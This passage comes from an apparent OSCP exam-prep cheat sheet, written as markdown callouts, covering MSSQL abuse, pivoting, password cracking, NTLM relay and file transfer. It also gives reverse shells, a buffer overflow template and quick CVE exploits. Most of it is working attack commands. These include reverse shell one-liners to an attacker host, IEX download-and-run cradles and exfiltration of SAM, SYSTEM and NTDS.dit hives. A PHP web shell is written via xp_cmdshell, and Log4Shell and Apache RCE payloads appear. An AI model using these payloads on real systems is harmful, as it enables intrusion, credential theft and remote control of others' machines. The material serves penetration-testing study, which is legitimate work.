> [!example] 🐧 Linux Bash: Deploying In-Network NTLM Relay Authentication Hijacking Servers Loops
> 
> Bash
> 
> ```
> sudo python3 ntlmrelayx.py -t smb://<TARGET_IP> -smb2support
> ```

## Step 7: Read/Write Files via MSSQL

> [!note] 🗄️ SQL Script: Arbitrary Local File System Ingestion via Bulk Insert Row Operation Providers
> 
> SQL
> 
> ```
> BULK INSERT ##tempcsv FROM 'C:\Windows\System32\drivers\etc\hosts' WITH (ROWTERMINATOR = '\n', FIELDTERMINATOR = ',');
> SELECT * FROM ##tempcsv;
> 
> -- Read file via OPENROWSET:
> SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) t;
> SELECT * FROM OPENROWSET(BULK N'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) t;
> 
> -- Write file (if sysadmin + proper permissions):
> EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\cmd.php';
> ```

## MSSQL Full Attack Decision Tree

> [!quote] 🌳 Logic Diagram: SQL Server Environment Compromise Lifecycle Path Blueprint
> 
> Plaintext
> 
> ```
> MSSQL Found (port 1433 or 1434 UDP)
>         │
>         ▼
> Try default/found creds:
>     sa : (blank)
>     sa : sa
>     sa : password
>     sa : Password123
>     <hostname> : <hostname>
>     <domain_user> : <known_pass>
>         │
>     ┌───┴───┐
>     │       │
>  Sysadmin? Not sysadmin?
>     │       │
>     │       ▼
>     │   Check IMPERSONATE rights
>     │   → Can impersonate SA? → EXECUTE AS LOGIN='sa'
>     │   → Now sysadmin!
>     │       │
>     ▼       ▼
> Enable xp_cmdshell → RCE on current server
>         │
>         ▼
> Check linked servers (sp_linkedservers)
>         │
>     ┌───┴────────────────────────────┐
>     │                                │
> No links                      Links found
>     │                                │
>     │                         Execute on linked server
>     │                         → xp_cmdshell there
>     │                         → Get shell on MS02/DC
>     │
>     ▼
> UNC injection → Responder → crack NetNTLMv2
> → or NTLM relay if SMB signing off
> ```

# 7. PIVOTING & TUNNELING

## When Do You Need to Pivot?

> [!quote] 🌳 Mappings: Host Network Separation Identification Checklist
> 
> Plaintext
> 
> ```
> MS01 (192.168.x.101) → needs to reach MS02 (10.10.10.50)
> Local service only accessible from victim machine (ss -tlnp shows 127.0.0.1)
> Found creds for internal host not directly reachable
> AD DC on internal subnet, not directly accessible
> ```

## Ligolo-ng (Best for OSCP — Full Network Tunnel)

## ── SETUP ────────────────────────────────────────────────────

> [!abstract] 🐧 Linux Bash: Setting Up Local Core Tunnel Interfaces and Launching proxy Infrastructure (Ligolo-ng)
> 
> Bash
> 
> ```
> sudo ip tuntap add user $(whoami) mode tun ligolo
> sudo ip link set ligolo up
> ./proxy -selfcert -laddr 0.0.0.0:11601
> ```

> [!abstract] 🐧 Linux Bash: Running Attacker Web Backends to Host Agent Executables Binaries
> 
> Bash
> 
> ```
> python3 -m http.server 80
> ```

> [!abstract] 💾 Windows CMD: Downloading and Running the Local Inbound Pivoting Agent (Windows Host Target)
> 
> DOS
> 
> ```
> certutil -urlcache -split -f http://<LHOST>/agent.exe agent.exe
> .\agent.exe -connect <LHOST>:11601 -ignore-cert
> ```

> [!abstract] 🐧 Linux Bash: Running the Local Inbound Pivoting Agent (Linux Compromised Endpoint Target)
> 
> Bash
> 
> ```
> ./agent -connect <LHOST>:11601 -ignore-cert
> ```

> [!abstract] 💬 Ligolo C2: In-Console Interrogation of Active Connection Streams and Networks Layouts
> 
> Plaintext
> 
> ```
> session                              # Select the agent
> ifconfig                             # See MS01's network interfaces (Note internal IPs, e.g., 10.10.10.0/24)
> start
> ```

> [!abstract] 🐧 Linux Bash: Registering Network Storage Boundaries Routes inside Attacker Host Kernels
> 
> Bash
> 
> ```
> sudo ip route add 10.10.10.0/24 dev ligolo
> ```

> [!check] 🐧 Linux Bash: Direct Multi-Protocol Reconnaissance Tracking Against Separated Internal Target Nodes
> 
> Bash
> 
> ```
> nmap -sV 10.10.10.50
> crackmapexec smb 10.10.10.50 -u user -p pass
> evil-winrm -i 10.10.10.50 -u user -p pass
> ```

> [!abstract] 💬 Ligolo C2: Exposing Isolated Internal Target Sub-Ports Back to Attacker Workspaces
> 
> Plaintext
> 
> ```
> listener_add --addr 0.0.0.0:8080 --to 10.10.10.50:80 --tcp
> ```

> [!abstract] 💬 Ligolo C2: Establishing Nested Forwarding Vectors over Secondary Separated Network Subnets
> 
> Plaintext
> 
> ```
> # Run second agent on MS02 (after getting shell there) via loopback listener:
> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
> # On MS02 execute binary targeting pivot host gateway:
> .\agent.exe -connect <MS01_IP>:11601 -ignore-cert
> ```

> [!abstract] 🐧 Linux Bash: Allocating Kernel Routes Mapping for Double Pivot Segment Trees
> 
> Bash
> 
> ```
> sudo ip route add 172.16.0.0/24 dev ligolo
> ```

## Chisel (Alternative)

> [!abstract] 🐧 Linux Bash: Launching Chisel Multi-Protocol Dynamic Reverse Proxy Listener Engine
> 
> Bash
> 
> ```
> ./chisel server -p 8888 --reverse
> ```

> [!abstract] 💾 Windows CMD: Establishing Chisel Ingress Reverse SOCKS Interface Tunnel Back-Connections
> 
> DOS
> 
> ```
> .\chisel.exe client <LHOST>:8888 R:socks
> ```

> [!check] 🐧 Linux Bash: Processing Network Transactions over Dynamic Tunnel Paths via Proxychains Configs
> 
> Bash
> 
> ```
> proxychains nmap -sT -Pn 10.10.10.50
> proxychains crackmapexec smb 10.10.10.50 -u user -p pass
> proxychains evil-winrm -i 10.10.10.50 -u user -p pass
> ```

> [!abstract] 💾 Windows CMD: Forwarding Specific Isolated Internal Node Ports Back to Attacker Workspaces
> 
> DOS
> 
> ```
> .\chisel.exe client <LHOST>:8888 R:3306:127.0.0.1:3306
> ```

## SSH Tunneling

> [!abstract] 🐧 Linux Bash: Allocating Local Sub-Ports Forwarding Mappings over Active OpenSSH Session Loops
> 
> Bash
> 
> ```
> ssh -L <LOCAL_PORT>:<INTERNAL_IP>:<INTERNAL_PORT> user@<MS01_IP>
> ssh -L 3389:10.10.10.50:3389 user@<MS01_IP>
> ```

> [!example] 🐧 Linux Bash: Interrogating Remote Desktop Frames over Locally Proxied Socket Interceptions
> 
> Bash
> 
> ```
> xfreerdp /v:localhost:3389 /u:user /p:pass
> ```

> [!abstract] 🐧 Linux Bash: Spawning Full Ingress SOCKS Forwarding Infrastructure Arrays via OpenSSH Nodes
> 
> Bash
> 
> ```
> ssh -D 1080 -N user@<MS01_IP>
> proxychains nmap -sT -Pn 10.10.10.0/24
> ```

> [!abstract] 💾 Windows CMD: Initializing Outbound Dynamic Reverse Network Channel Tunnels via Compromised Assets
> 
> DOS
> 
> ```
> ssh -R 4444:127.0.0.1:4444 attacker@<LHOST>
> ssh -R 445:127.0.0.1:445 attacker@<LHOST>
> ```

## Plink (Windows — when no SSH client)

> [!abstract] 💾 Windows CMD: Requesting Diagnostic Binary Transfers for Standalone OpenSSH Forwarding Clients
> 
> DOS
> 
> ```
> certutil -urlcache -split -f http://<LHOST>/plink.exe plink.exe
> ```

> [!abstract] 💾 Windows CMD: Launching Non-Interactive Automated Reverse SSH Port Forwarding Encapsulations (Plink Engine)
> 
> DOS
> 
> ```
> cmd /c echo y | .\plink.exe -ssh -l root -pw <SSH_PASS> -R 127.0.0.1:4455:127.0.0.1:445 <LHOST>
> ```

# 8. PASSWORD ATTACKS

## Hash Identification

> [!check] 🐧 Linux Bash: Local Cryptographic Encryption Algorithm Identification Triage Scans
> 
> Bash
> 
> ```
> hashid <HASH>
> hash-identifier   # interactive
> ```

> [!abstract] 🌳 Markdown List: Standard System Operating Cryptographic Mode Flags Index
> 
> Plaintext
> 
> ```
> # Common hash types:
> # $1$    → MD5crypt       (-m 500)
> # $2y$   → bcrypt         (-m 3200)
> # $5$    → SHA256crypt    (-m 7400)
> # $6$    → SHA512crypt    (-m 1800)
> # 32 hex → NTLM           (-m 1000) or MD5 (-m 0)
> # NTLM always 32 char hex, no salt
> ```

## Hashcat Modes Reference

> [!caution] **Highly Optimized Hardware Kapacitor Override Performance Constraints** Always append `--force -O -w 4 --opencl-device-types 1,2` to your Hashcat processing chains to ensure full computing block usage.

Shell

```
# hashcat -m <MODE> hashfile.txt wordlist.txt [rules]
# Modes:
#   0     → MD5
#   100   → SHA1
#   1000  → NTLM         (Windows local hashes)
#   1400  → SHA256
#   1800  → SHA512crypt  (Linux /etc/shadow $6$)
#   500   → MD5crypt     (Linux /etc/shadow $1$)
#   3200  → bcrypt       ($2a$, $2b$, $2y$)
#   5600  → NetNTLMv2    (Responder capture)
#   5500  → NetNTLMv1
#   13100 → Kerberoast   (TGS-REP)
#   18200 → AS-REP       (AS-REP roast)
#   22000 → WPA2-PBKDF2
```

> [!check] 🐧 Linux Bash: High-Velocity Decryption Processing targeting Local or Intercepted Hashes
> 
> Bash
> 
> ```
> hashcat -m 1000 ntlm.txt rockyou.txt --force -O -w 4 --opencl-device-types 1,2
> hashcat -m 5600 netntlm.txt rockyou.txt --force -O -w 4 --opencl-device-types 1,2
> hashcat -m 13100 tgs.txt rockyou.txt -r rules/best64.rule --force -O -w 4 --opencl-device-types 1,2
> hashcat -m 18200 asrep.txt rockyou.txt --force -O -w 4 --opencl-device-types 1,2
> hashcat -m 1800 shadow.txt rockyou.txt --force -O -w 4 --opencl-device-types 1,2
> ```

> [!abstract] 🌳 Markdown List: Core High-Performance Cryptographic Rules Files Reference Checklist
> 
> Plaintext
> 
> ```
> /usr/share/hashcat/rules/best64.rule
> /usr/share/hashcat/rules/d3ad0ne.rule
> /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule  # most comprehensive
> ```

## Custom Wordlists

> [!check] 🐧 Linux Bash: Mining Cleartext Strings from Target Web Domains (Contextual Dictionary Generation)
> 
> Bash
> 
> ```
> cewl http://<TARGET_IP> -m 5 -d 3 -w cewl.txt
> cewl http://<TARGET_IP> -m 5 -d 3 --with-numbers -w cewl_nums.txt
> ```

> [!abstract] 🌳 Markdown List: Core Target Names In-Vault Manipulation Permutations Template Checklist
> 
> Plaintext
> 
> ```
> # If you find "John Smith":
> john          smith         jsmith
> j.smith       johnsmith     smithjohn
> john.smith    J.Smith       John.Smith
> ```

> [!check] 🐧 Linux Bash: Running Dictionary Generation Permutations over Standard Rules Repositories
> 
> Bash
> 
> ```
> hashcat --stdout wordlist.txt -r rules/best64.rule > mutated.txt
> ```

## Online Brute Force

> [!check] 🐧 Linux Bash: Launching Automated Network Protocol Ingress Brute-Force Attacks (Hydra Framework)
> 
> Bash
> 
> ```
> hydra -l root -P rockyou.txt ssh://<TARGET_IP> -t 4 -V
> hydra -l admin -P rockyou.txt <TARGET_IP> http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
> hydra -l admin -P rockyou.txt http-get://<TARGET_IP>/admin/
> hydra -L users.txt -P rockyou.txt ftp://<TARGET_IP> -t 10
> hydra -l sa -P rockyou.txt mssql://<TARGET_IP>
> ```

> [!check] 🐧 Linux Bash: Launching Automated Multi-Threaded Remote Desktop Authentication Sprays (Crowbar Integration)
> 
> Bash
> 
> ```
> crowbar -b rdp -s <TARGET_IP>/32 -u administrator -C rockyou.txt
> ```

> [!check] 🐧 Linux Bash: Processing Wide Subnet Credential Sprays targeting SMB and WinRM Entry Infrastructure
> 
> Bash
> 
> ```
> netexec smb <TARGET_IP> -u users.txt -p passwords.txt --no-bruteforce
> netexec winrm <TARGET_IP> -u users.txt -p passwords.txt
> ```

## NTLM Capture & Relay

> [!abstract] 🐧 Linux Bash: Initializing Outbound Traffic Interception Engines capturing Network Hashing Protocols
> 
> Bash
> 
> ```
> sudo responder -I tun0 -dwv
> ```

> [!check] 🐧 Linux Bash: Processing Offline Decryption Modules targeting Captured Intercepted NetNTLMv2 Exchange Logs
> 
> Bash
> 
> ```
> hashcat -m 5600 Responder/logs/HTTP-NTLMv2-*.txt rockyou.txt
> ```

> [!check] 🐧 Linux Bash: Identifying Domain Asset Compute Targets with SMB Data Signing Protections Disabled
> 
> Bash
> 
> ```
> netexec smb <SUBNET>/24 --gen-relay-list unsigned.txt
> ```

> [!example] 🐧 Linux Bash: Launching Authentication Traffic Relaying Ingress Infrastructure Servers Loops
> 
> Bash
> 
> ```
> sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support
> ```

> [!example] 🐧 Linux Bash: Instantiating Interactive Process Port Relays within NTLM Relaying Modules
> 
> Bash
> 
> ```
> sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support -i
> # Connection catch point:
> nc 127.0.0.1 <RELAY_PORT>
> ```

# 9. FILE TRANSFER CHEATSHEET

## Linux ➔ Windows (Download on victim)

> [!note] 🪟 PowerShell: In-Memory Script Payload Streaming and Execute-Only Process Allocations
> 
> PowerShell
> 
> ```
> IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')  # execute in memory
> ```

> [!note] 🪟 PowerShell: Hard-Disk Storage Target Downloader Transfers Assemblies Execution
> 
> PowerShell
> 
> ```
> (New-Object Net.WebClient).DownloadFile('http://<LHOST>/file.exe','C:\Temp\file.exe')
> Invoke-WebRequest -Uri http://<LHOST>/file.exe -OutFile C:\Temp\file.exe
> wget http://<LHOST>/file.exe -OutFile C:\Temp\file.exe  # PS alias
> ```

> [!note] 💾 Windows CMD: Downloading Inbound Payload Files via Built-In Cryptographic Cache Managers
> 
> DOS
> 
> ```
> certutil -urlcache -split -f http://<LHOST>/file.exe C:\Temp\file.exe
> ```

> [!note] 💾 Windows CMD: Registering Background Asynchronous Download Queue Tasks (BITS Engine)
> 
> DOS
> 
> ```
> bitsadmin /transfer job /download /priority normal http://<LHOST>/file.exe C:\Temp\file.exe
> ```

> [!abstract] 🐧 Linux Bash: Launching Loopback Shared Drives Directories Hosting Modules (Impacket Server Module)
> 
> Bash
> 
> ```
> python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support
> ```

> [!note] 💾 Windows CMD: Copying Payload Binaries Directly across Active Shared Network Mount Drives
> 
> DOS
> 
> ```
> copy \\<LHOST>\share\file.exe C:\Temp\
> # Or manual mounting logic strings:
> net use Z: \\<LHOST>\share
> copy Z:\file.exe C:\Temp\
> ```

## Windows ➔ Linux (Exfil from victim)

> [!abstract] 🐧 Linux Bash: Initializing Secure Shared Drive Ingress Platforms for Target Files Ingestion
> 
> Bash
> 
> ```
> impacket-smbserver share . -smb2support -username user -password pass
> ```

> [!note] 💾 Windows CMD: Exfiltrating Active Configuration Hashes Databases across Attacker Mounted Volumes
> 
> DOS
> 
> ```
> copy C:\Windows\System32\config\SAM \\<LHOST>\share\SAM
> ```

> [!note] 💾 Windows CMD: Authenticating and Transferring Core Security Hives in Compromised Remote Shell environments
> 
> DOS
> 
> ```
> net use \\10.10.15.201\share /user:user pass
> cmd.exe /c move SAM \\IP\share\
> cmd.exe /c move SECURITY \\''\share\
> cmd.exe /c move SYSTEM \\''\share\
> cmd.exe /c move NTDS.dit \\''\share\
> ```

> [!check] 🐧 Linux Bash: Remote Extraction of Corporate Domain Accounts Hashes (Ntdsutil Core Automation)
> 
> Bash
> 
> ```
> netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
> ```

> [!note] 💾 Windows CMD: Consolidated Mass Copying of Sensitive Target Security Configuration Hives
> 
> DOS
> 
> ```
> copy C:\Windows\System32\config\SAM C:\Windows\System32\config\SYSTEM C:\Windows\System32\config\SECURITY \\<LHOST>\share\
> ```

> [!abstract] 🐧 Linux Bash: Launching Local File Delivery Web Receivers (Attacker Upload Server Engine)
> 
> Bash
> 
> ```
> python3 uploadserver.py
> ```

> [!note] 🪟 PowerShell: Exfiltrating Consolidated System Files Archive Streams via Outbound HTTP POST Form Vectors
> 
> PowerShell
> 
> ```
> Invoke-WebRequest -Uri http://<LHOST>/upload -Method POST -InFile C:\loot\dump.zip -ContentType "application/octet-stream"
> ```

> [!note] 🪟 PowerShell: Encoding Raw Binary System Components into Cleartext Base64 Paste Arrays
> 
> PowerShell
> 
> ```
> [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\file.txt"))
> ```

> [!note] 🐧 Linux Bash: Base64 Decryption Processing to Restore Transported System Components
> 
> Bash
> 
> ```
> echo '<BASE64_STRING>' | base64 -d > file.txt
> ```

> [!abstract] 🐧 Linux Bash: Initializing Target-Facing File Capture Receivers via Raw Socket Listeners
> 
> Bash
> 
> ```
> nc -lvnp 9001 > file.exe
> ```

> [!note] 💾 Windows CMD: Exfiltrating Target Files via Redirection Operators over Outbound Raw Streams Connection
> 
> DOS
> 
> ```
> nc.exe <LHOST> 9001 < C:\file.exe
> ```

## Linux ➔ Linux

> [!abstract] 🐧 Linux Bash: Attacker Web Application Hosting Server Initialization Layout
> 
> Bash
> 
> ```
> python3 -m http.server 80
> ```

> [!note] 🐧 Linux Bash: Ingress Ingestion of Malicious Script Components over Target Terminal Partitions
> 
> Bash
> 
> ```
> wget http://<LHOST>/file
> curl http://<LHOST>/file -o file
> ```

> [!note] 🐧 Linux Bash: Automated Secured Symmetric File Synchronization Exchanges between Linux Targets
> 
> Bash
> 
> ```
> scp file.txt user@<TARGET_IP>:/tmp/
> ```

> [!abstract] 🐧 Linux Bash: Local Receiver Interception Configuration mapping for Raw Linux Data Partitions Transfer
> 
> Bash
> 
> ```
> nc -lvnp 4444 > file
> ```

> [!note] 🐧 Linux Bash: Transmitting Target Assets via Pipeline Redirections over Established Socket Paths
> 
> Bash
> 
> ```
> nc <RECEIVER_IP> 4444 < file
> ```

> [!note] 🐧 Linux Bash: Base64 Conversion Operations tracking System Application Executables
> 
> Bash
> 
> ```
> base64 -w0 file.exe   # encode
> echo '<BASE64_STRING>' | base64 -d > file.exe  # decode
> ```

# 10. SHELLS & UPGRADES

## Reverse Shell One-Liners

## ── Linux ─────────────────────────────────────────────────────

> [!example] 🐧 Linux Bash: Standard POSIX File Descriptor Loop Interception Reverse Shell Ingress
> 
> Bash
> 
> ```
> bash -i >& /dev/tcp/<LHOST>/4444 0>&1
> /bin/bash -i >& /dev/tcp/<LHOST>/4444 0>&1
> ```

> [!example] 🌐 URL Ingress: URL Encoded Variant of the Standard POSIX Bash Pipeline (Web Param Fuzz Injection)
> 
> Plaintext
> 
> ```
> bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<LHOST>%2F4444%200%3E%261%22
> ```

> [!example] 🐧 Linux Bash: Spawning Inbound Network Connections Interceptions via Python Socket Sub-Processes
> 
> Bash
> 
> ```
> python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
> ```

> [!example] 🌐 URL Ingress: Hardcoded Arbitrary Command Injection System Backdoor Hook Wrapper
> 
> Plaintext
> 
> ```
> <?php system($_GET["cmd"]); ?>
> ```

> [!example] 🐧 Linux Bash: Instantiating PHP Back-Network Terminal Streams Connection via Interactive Ingress Flags
> 
> Bash
> 
> ```
> php -r '$sock=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
> ```

> [!example] 🐧 Linux Bash: Spawning Perl Environmental Core Process Strings for Outbound Shell Handling
> 
> Bash
> 
> ```
> perl -e 'use Socket;$i="<LHOST>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
> ```

> [!example] 🐧 Linux Bash: Traditional Inbound Shell Processing via Executable Redirection Handlers (Netcat Integration)
> 
> Bash
> 
> ```
> nc -e /bin/sh <LHOST> 4444
> ```

> [!example] 🐧 Linux Bash: Evasive Named Pipe Non-Interactive Terminal Loop Interception Spawning (FIFO Backdoors)
> 
> Bash
> 
> ```
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
> ```

## ── Windows ───────────────────────────────────────────────────

> [!example] 🐧 Linux Bash: Attacker Automated Compilation of Base64 In-Memory Script Loading Strings
> 
> Bash
> 
> ```
> python3 -c "
> import base64
> cmd = 'IEX(New-Object Net.WebClient).DownloadString(\"http://<LHOST>/shell.ps1\")'
> b64 = base64.b64encode(cmd.encode('utf-16-le')).decode()
> print('powershell -nop -w hidden -enc ' + b64)
> "
> ```

> [!example] 🪟 PowerShell: Native Assembly Non-Interactive Socket Client Thread Connection Loops
> 
> PowerShell
> 
> ```
> powershell -nop -w hidden -c "\$c=New-Object Net.Sockets.TCPClient('<LHOST>',4444);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$rb=[text.encoding]::ASCII.GetBytes(\$sb2);\$s.Write(\$rb,0,\$rb.Length)}"
> ```

> [!example] 🐧 Linux Bash: Generating Cross-Platform Windows Execution Payloads via Automated Assembly Factories
> 
> Bash
> 
> ```
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f raw -o shell.jsp
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
> ```

## Shell Upgrade (Linux — TTY)

## Method 1: Python PTY (most reliable)

> [!example] 🐧 Linux Bash: Python Pseudo-Terminal Spawning to Break Out of Blind Shell Threads
> 
> Bash
> 
> ```
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> # Alternative legacy execution string:
> python -c 'import pty; pty.spawn("/bin/bash")'
> ```

> [!example] 🐧 Linux Bash: Relocating Shell Context Handlers out of Active Volatile Space via Foreground Controls
> 
> Bash
> 
> ```
> # Background the session using: Ctrl + Z
> # Reset hardware echo configurations and restore foreground:
> stty raw -echo; fg
> ```

> [!example] 🐧 Linux Bash: Stabilizing Interactive Terminal Global System Environmental Variables
> 
> Bash
> 
> ```
> export TERM=xterm
> export SHELL=/bin/bash
> stty rows 48 columns 190            # match your terminal exactly
> stty size
> ```

## Method 2: Script

> [!example] 🐧 Linux Bash: Stabilizing Terminal Contexts via POSIX Script Generation Records
> 
> Bash
> 
> ```
> script /dev/null -c bash
> # Background via Ctrl + Z -> stty raw -echo; fg -> export TERM=xterm
> ```

## Method 3: Socat (best quality, needs socat on victim)

> [!abstract] 🐧 Linux Bash: Initializing Advanced Fully Stable Hardware Listeners (Socat Attacker Server Node)
> 
> Bash
> 
> ```
> socat file:`tty`,raw,echo=0 tcp-listen:4444
> ```

> [!example] 🐧 Linux Bash: Compromised Endpoint Back-Connection to Attacker Advanced Socat Receivers
> 
> Bash
> 
> ```
> socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:4444
> ```

# 11. EXPLOIT DEVELOPMENT (BOF REFERENCE)

## Windows x86 Stack Buffer Overflow

## ── Step 1: Fuzzing ──────────────────────────────────────────

> [!example] 🐍 Python Script: Automated Network Fuzzing Matrix to Determine Memory Crash Thresholds
> 
> Python
> 
> ```
> import socket, time
> 
> payload = b"A" * 100
> while True:
>     try:
>         s = socket.socket()
>         s.connect(('TARGET_IP', PORT))
>         banner = s.recv(1024)
>         s.send(b"COMMAND " + payload + b"\r\n")
>         s.close()
>         print(f"[*] Sent {len(payload)} bytes")
>         payload += b"A" * 100
>         time.sleep(1)
>     except Exception as e:
>         print(f"[!] Crashed at ~{len(payload)} bytes")
>         break
> ```

## ── Step 2: EIP Offset ───────────────────────────────────────

> [!example] 🐧 Linux Bash: Creating Non-Repeating Cyclical Pattern Strings to Isolate Offset Ranges
> 
> Bash
> 
> ```
> msf-pattern_create -l <CRASH_LENGTH>
> ```

> [!check] 💬 Immunity Debugger: Calculating Explicit Distance Metrics targeting the EIP Pointer Registers (Mona Library)
> 
> Plaintext
> 
> ```
> !mona findmsp -distance <CRASH_LENGTH>
> ```

## ── Step 3: Verify EIP Control ───────────────────────────────

Python

```
# Payload verification configuration mapping:
# payload = b"A" * OFFSET + b"B" * 4 + b"C" * (2000 - OFFSET - 4)
# EIP register output state should read precisely: 42424242
```

## ── Step 4: Bad Chars ────────────────────────────────────────

> [!check] 💬 Immunity Debugger: Generating Hex Byte Arrays to Identify Bad Character Droppers Exclusion Lists
> 
> Plaintext
> 
> ```
> !mona bytearray -b "\x00"
> # Compare hex layouts after memory transaction delivery:
> !mona compare -f C:\mona\bytearray.bin -a <ESP_ADDRESS>
> ```

## ── Step 5: JMP ESP ──────────────────────────────────────────

> [!check] 💬 Immunity Debugger: Identifying Unprotected Dynamic Assembly Execution Jump Pointers
> 
> Plaintext
> 
> ```
> !mona jmp -r esp -cpb "\x00\x0a\x0d"  (add your bad chars)
> ```

## ── Step 6: Shellcode ────────────────────────────────────────

> [!example] 🐧 Linux Bash: Compiling Target Evasive Windows Architecture Payload Byte Arrays
> 
> Bash
> 
> ```
> msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f python -b "\x00\x0a\x0d" EXITFUNC=thread
> ```

## ── Step 7: Final Exploit ────────────────────────────────────

> [!example] 🐍 Python Script: Consolidated Buffer Overflow Exploit Blueprint Construction File Template
> 
> Python
> 
> ```
> from struct import pack
> 
> offset   = <OFFSET_VALUE>
> jmp_esp  = pack("<I", <JMP_ESP_ADDRESS>)  # little-endian
> nops     = b"\x90" * 16
> # Paste msfvenom buf here as shellcode
> 
> payload = b"A" * offset + jmp_esp + nops + shellcode
> ```

# 12. COMMON CVEs & EXPLOITS

## High-Value CVE Quick Reference

> [!quote] 🌳 Mappings: Elite Common Vulnerabilities & Public Exploits Reference Matrix
> 
> Plaintext
> 
> ```
> CVE / EXPLOIT        TARGET                    IMPACT
> ─────────────────────────────────────────────────────────────────
> MS17-010 EternalBlue Win7/2008 R2 (SMB v1)   → SYSTEM
>   nmap: smb-vuln-ms17-010; manual: helperlibs; msf: ms17_010
> 
> CVE-2019-0708 BlueKeep  Win7/2008 RDP        → RCE/SYSTEM
>   msf: cve_2019_0708_bluekeep_rce (unstable)
> 
> CVE-2021-41773       Apache 2.4.49 PATH traversal → RCE
>   curl 'http://<IP>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo;id'
> 
> CVE-2021-42013       Apache 2.4.50 (bypass of above)
>   curl 'http://<IP>/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh' -d 'echo;id'
> 
> CVE-2021-3156 Baron  sudo <1.9.5p2             → local root
>   sudoedit -s '\' $(python3 -c 'print("A"*65536)')
> 
> CVE-2021-4034 PwnKit pkexec all distros        → local root
>   https://github.com/ly4k/PwnKit
> 
> CVE-2022-0847 DirtyPipe kernel 5.8-5.16.11    → local root
>   write to read-only files → overwrite /etc/passwd
> 
> CVE-2016-5195 DirtyCow kernel <4.8.3           → local root
> 
> CVE-2021-44228 Log4Shell  Log4j 2.x Java       → RCE
>   ${jndi:ldap://<LHOST>:1389/a} in any logged header
> 
> CVE-2021-1675/34527 PrintNightmare  Win2019/10 → SYSTEM/RCE
>   SharpPrintNightmare.exe \\<IP> C:\path\to\payload.dll
> 
> CVE-2022-26134 Confluence 7.4.17 OGNL injection → RCE
>   curl 'http://<IP>/%24%7B%40com.opensymphony.xwork2.ActionContext...'
> 
> CVE-2023-4966 Citrix Bleed  Citrix ADC/Gateway → session hijack
> ```

## SearchSploit Workflow

> [!check] 🐧 Linux Bash: Indexing Local Exploit-DB Records Repositories for Public Vulnerability Matches
> 
> Bash
> 
> ```
> searchsploit apache 2.4
> searchsploit "windows smb" remote
> searchsploit -w openssh 7.2    # Show Exploit-DB URL
> ```

> [!check] 🐧 Linux Bash: Moving Targeted Exploit Scripts into Current Operational Workspace Folder
> 
> Bash
> 
> ```
> searchsploit -m 47837          # Copy exploit #47837
> ```

> [!check] 🐧 Linux Bash: Non-Destructive Code Inspection of Discovered Exploit Script File Lines
> 
> Bash
> 
> ```
> searchsploit -x 47837
> ```

> [!check] 🐧 Linux Bash: Synchronizing Local Exploit Databases with Remote Public Master Lists
> 
> Bash
> 
> ```
> searchsploit -u
> ```

> [!check] 🐧 Linux Bash: Filtering Security Exploitation Search Layouts by Operating System Architecture
> 
> Bash
> 
> ```
> searchsploit --os windows --type webapps php
> ```

# 13. EXAM DAY TIPS

## Before Starting (15 min prep)

> [!abstract] 🌳 Markdown List: Pre-Flight Network Connection and Ingress Environment Tracking Configuration Checklist
> 
> Plaintext
> 
> ```
> ☐ VPN connected — verify routing: ping <DC_IP>
> ☐ Note all IPs given: DC, MS01, MS02, Box1, Box2, Box3
> ☐ Update /etc/hosts with all IPs (add hostnames as you find them)
> ☐ Create loot structure:
>     mkdir -p ~/exam/{ad/{ms01,ms02,dc},box{1,2,3}}/{scans,loot,exploits,screenshots}
> ☐ Open notes file per machine (use CherryTree / Obsidian / Markdown)
> ☐ Screenshot tool ready (Flameshot: flameshot gui)
> ☐ Start nmap scans on ALL targets immediately
> ☐ Start tmux: 1 window per machine, split panes
> ☐ Write provided AD credentials FIRST in notes
> ```

## Notes Template Per Machine

Markdown

```
## Machine: <HOSTNAME> — <IP> — <OS>
**Status:** In Progress / Owned
**Flags:**
- local.txt:  ________________
- proof.txt:  ________________

### Ports / Services
| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 80   | HTTP    | Apache 2.4.49 | LFI vuln |

### Attack Path
